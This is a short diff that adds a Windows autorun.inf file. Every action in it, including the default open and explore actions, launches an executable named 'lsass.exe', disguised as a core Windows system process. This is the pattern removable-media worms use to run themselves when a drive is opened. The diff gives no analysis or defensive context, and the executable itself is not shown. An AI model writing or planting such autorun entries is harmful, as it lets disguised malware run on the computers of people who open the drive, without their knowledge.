@@ -1,0 +1,5 @@
+[AutoRun]
+open=lsass.exe
+shell\open\Command=lsass.exe
+shell\open\Default=1
+shell\explore\Command=lsass.exe 
